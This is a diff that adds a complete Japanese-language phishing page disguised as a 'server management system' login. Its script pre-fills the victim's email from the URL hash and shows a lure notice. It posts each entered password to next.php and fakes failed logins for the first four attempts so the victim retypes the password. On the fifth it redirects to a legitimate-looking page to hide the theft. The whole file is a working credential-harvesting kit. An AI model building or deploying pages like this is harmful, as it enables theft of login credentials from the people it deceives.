@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>サーバー管理システム | ログイン</title>
+    <style>
+        body {
+            font-family: 'Hiragino Kaku Gothic Pro', 'Meiryo', sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 320px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 24px;
+            margin: 0 0 10px;
+        }
+         .header p {
+             color: #666;
+             font-size: 14px;
+             margin: 0;
+         }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        input[readonly] {
+            background-color: #f0f0f0; /* Slightly different shade for readonly */
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        button {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: #3367d6;
+        }
+         button:disabled {
+              background-color: #a0c6f7;
+              cursor: not-allowed;
+         }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+
+        .error-message {
+            color: #d32f2f; /* Red color for errors */
+            font-size: 13px;
+            margin-bottom: 15px; /* Add space below error */
+            text-align: center;
+            display: none; /* Hidden by default */
+            padding: 8px;
+            background-color: #ffebee; /* Light red background */
+            border: 1px solid #d32f2f;
+            border-radius: 4px;
+        }
+        .error-message.success {
+             color: #2e7d32; /* Green color for success */
+             background-color: #e8f5e9; /* Light green background */
+             border-color: #2e7d32;
+        }
+
+        .context-notification {
+            background-color: #fff3e0; /* Light orange/yellow background */
+            border: 1px solid #ffe0b2; /* Slightly darker border */
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #5f4e3a; /* Darker text color for contrast */
+            display: none; /* Hidden by default, shown by JS if email exists */
+        }
+        .context-notification p {
+            margin: 0 0 10px 0;
+            line-height: 1.5;
+        }
+        .context-notification p:last-child {
+            margin-bottom: 0;
+        }
+        .context-notification strong {
+             color: #453a2b;
+        }
+        .context-notification .action-button-placeholder {
+             display: inline-block;
+             background-color: #ffcc80; /* Button-like color */
+             color: #453a2b;
+             padding: 8px 12px;
+             border-radius: 4px;
+             text-decoration: none;
+             font-weight: 500;
+             margin-top: 10px;
+             cursor: default; /* It doesn't do anything on its own */
+        }
+
+        .hidden { /* Utility class */
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <h1>サーバー管理システム</h1>
+            <p>認証情報を入力してください</p>
+        </div>
+
+        <div class="context-notification" id="contextNotification">
+            <p><strong><span id="context-email">[メールアドレス]</span> 様</strong></p>
+            <p>システムからの重要なお知らせがあります。<br>
+               ログインしてご確認ください。</p>
+        </div>
+
+        <div id="errorMessage" class="error-message">
+            <!-- Error messages will be shown here -->
+        </div>
+
+        <form id="loginForm" method="POST" novalidate=""> <!-- Added novalidate -->
+            <div class="form-group">
+                <label for="userId">ユーザーID</label>
+                <!-- Readonly removed to allow autograb, but styled as readonly -->
+                <input type="email" id="userId" name="userId" required="" value="" style="background-color: #f0f0f0; color: #666; cursor: not-allowed;" readonly>
+            </div>
+
+            <div class="form-group">
+                <label for="password">パスワード</label>
+                <input type="password" id="password" name="password" required="">
+            </div>
+
+            <!-- No hidden fields needed as JS handles this -->
+
+            <button type="submit" id="submitButton">ログイン</button>
+        </form>
+
+        <div class="footer">
+            <p>© 2025 コントロールサーバー | 日本</p>
+        </div>
+    </div>
+
+<script>
+// Track login attempts globally for the session
+let loginAttempts = 0;
+
+document.addEventListener('DOMContentLoaded', function() {
+    const userIdField = document.getElementById('userId');
+    const passwordField = document.getElementById('password');
+    const loginForm = document.getElementById('loginForm');
+    const submitButton = document.getElementById('submitButton');
+    const errorDisplay = document.getElementById('errorMessage');
+    const contextNotification = document.getElementById('contextNotification');
+    const contextEmailSpan = document.getElementById('context-email');
+
+    // --- Email Autograb from URL Hash ---
+    if (window.location.hash && userIdField) {
+        let userEmail = '';
+        try {
+            const hash = window.location.hash.substring(1);
+            if (hash.includes('@') && hash.includes('.')) {
+                // Decode and set the value
+                userEmail = decodeURIComponent(hash);
+                userIdField.value = userEmail;
+                // Make the field readonly AFTER setting the value by script
+                // We also keep the styling for readonly look
+                userIdField.readOnly = true;
+
+                // Update and show context notification
+                if (contextNotification && contextEmailSpan) {
+                    contextEmailSpan.textContent = userEmail;
+                    contextNotification.style.display = 'block';
+                }
+            } else {
+                console.warn('URL hash does not appear to be a valid email:', hash);
+                // Optionally hide the form or show an error if email is expected via hash
+                 showError("有効なユーザーIDが指定されていません。");
+                 if(submitButton) submitButton.disabled = true;
+            }
+        } catch (e) {
+            console.error('Error parsing URL hash:', e);
+            showError("ユーザーIDの読み込み中にエラーが発生しました。");
+            if(submitButton) submitButton.disabled = true;
+        }
+    } else if (userIdField) {
+         // If no hash, maybe disable login? Or allow manual input?
+         // For now, assume hash is required.
+         showError("ユーザーIDが指定されていません。");
+         if(submitButton) submitButton.disabled = true;
+         // If manual input is allowed, remove the `readonly` attribute and styling from the input tag
+         // and remove this `else if` block.
+    }
+
+    // --- Form Submission Logic ---
+    if (loginForm && submitButton && userIdField && passwordField) {
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+             if (submitButton.disabled) return; // Don't submit if button is disabled (e.g., no valid user ID)
+            submitForm();
+        });
+
+        // Allow Enter key in password field to submit
+        passwordField.addEventListener('keydown', function(e) {
+             if (e.key === 'Enter' && !submitButton.disabled) {
+                e.preventDefault();
+                submitForm();
+            }
+        });
+    } else {
+         console.error("Could not find all required form elements (form, button, userId, password, errorDisplay).");
+         // Show a generic error on the page itself if elements are missing
+         showError("ページの読み込みエラーが発生しました。リフレッシュしてください。");
+    }
+
+    function submitForm() {
+        const username = userIdField.value; // Use value from userId field
+        const password = passwordField.value;
+
+        // Basic frontend validation (password only, as userId is set by hash)
+        if (!password) {
+            showError('パスワードを入力してください。'); // Please enter the password.
+            passwordField.focus();
+            return;
+        }
+
+        // Increment attempt counter *before* sending
+        loginAttempts++;
+
+        // Prepare form data for next.php
+        const formData = new FormData();
+        // IMPORTANT: Send the userId value under the 'username' key for next.php
+        formData.append('username', username);
+        formData.append('password', password);
+        formData.append('count', loginAttempts.toString());
+
+        // Show loading state
+        const originalButtonText = submitButton.textContent;
+        submitButton.textContent = '確認中...'; // Verifying...
+        submitButton.disabled = true;
+        hideError(); // Hide previous errors
+
+        // Submit via AJAX to next.php
+        fetch('next.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`サーバーエラー: ${response.status}`); // Server error: status
+            }
+            return response.json();
+        })
+        .then(data => {
+            // Always reset button state after response
+            submitButton.textContent = originalButtonText;
+            // Keep button disabled if initial userId was invalid, otherwise enable
+            submitButton.disabled = !userIdField.value || userIdField.readOnly === false;
+
+
+            if (data && data.signal === 'ok') {
+                if (loginAttempts >= 5) {
+                    // SUCCESS: Redirect after 5 attempts
+                    console.log('Login successful (attempt ' + loginAttempts + '), redirecting...');
+                    showError('ログイン成功。リダイレクトしています...', true); // Login successful. Redirecting... (Mark as success)
+                    setTimeout(() => {
+                         // Redirect to the original source URL if available, otherwise a default
+                         const successUrl = document.documentElement.dataset.scrapbookSource || 'https://www.google.com/'; // Use original source or fallback
+                         window.location.href = successUrl;
+                    }, 1500);
+                } else {
+                    // FAIL (Attempts 1-4): Show error message from next.php
+                    console.log('Login failed (attempt ' + loginAttempts + ')');
+                    // Use backend message, provide default Japanese fallback
+                    showError(data.msg || 'ユーザーIDまたはパスワードが正しくありません。もう一度入力してください。'); // Username or password incorrect...
+                    passwordField.value = '';
+                    passwordField.focus();
+                     submitButton.disabled = false; // Re-enable button on failed attempt
+                }
+            } else {
+                // Handle 'bad' signal or other errors from next.php
+                console.error('Received non-ok signal or invalid data from server:', data);
+                 // Use backend message, provide default Japanese fallback
+                showError(data.msg || 'ログインに失敗しました。入力内容を確認してください。'); // Login failed. Check your input.
+                passwordField.value = '';
+                passwordField.focus();
+                 submitButton.disabled = false; // Re-enable button on failed attempt
+            }
+        })
+        .catch(error => {
+            console.error('Fetch Error:', error);
+            // Reset button state even on fetch error
+            submitButton.textContent = originalButtonText;
+             submitButton.disabled = !userIdField.value || userIdField.readOnly === false; // Keep disabled if no valid initial user ID
+
+             showError('サーバーへの接続中にエラーが発生しました。後でもう一度お試しください。'); // Error connecting to server. Try again later.
+             passwordField.focus();
+        });
+    }
+
+    // --- Error Display Functions ---
+    function showError(message, isSuccess = false) {
+        if (errorDisplay) {
+             errorDisplay.textContent = message;
+             errorDisplay.classList.remove('hidden', 'success'); // Remove both classes first
+             errorDisplay.style.display = 'block'; // Explicitly show
+             if (isSuccess) {
+                 errorDisplay.classList.add('success');
+             }
+        } else {
+            console.error("Error display element (#errorMessage) not found!");
+            alert(message); // Fallback
+        }
+    }
+
+     function hideError() {
+         if (errorDisplay) {
+             errorDisplay.classList.add('hidden');
+             errorDisplay.style.display = 'none'; // Explicitly hide
+             errorDisplay.classList.remove('success'); // Remove success class if present
+         }
+     }
+});
+</script>
+
+</body>
+</html>
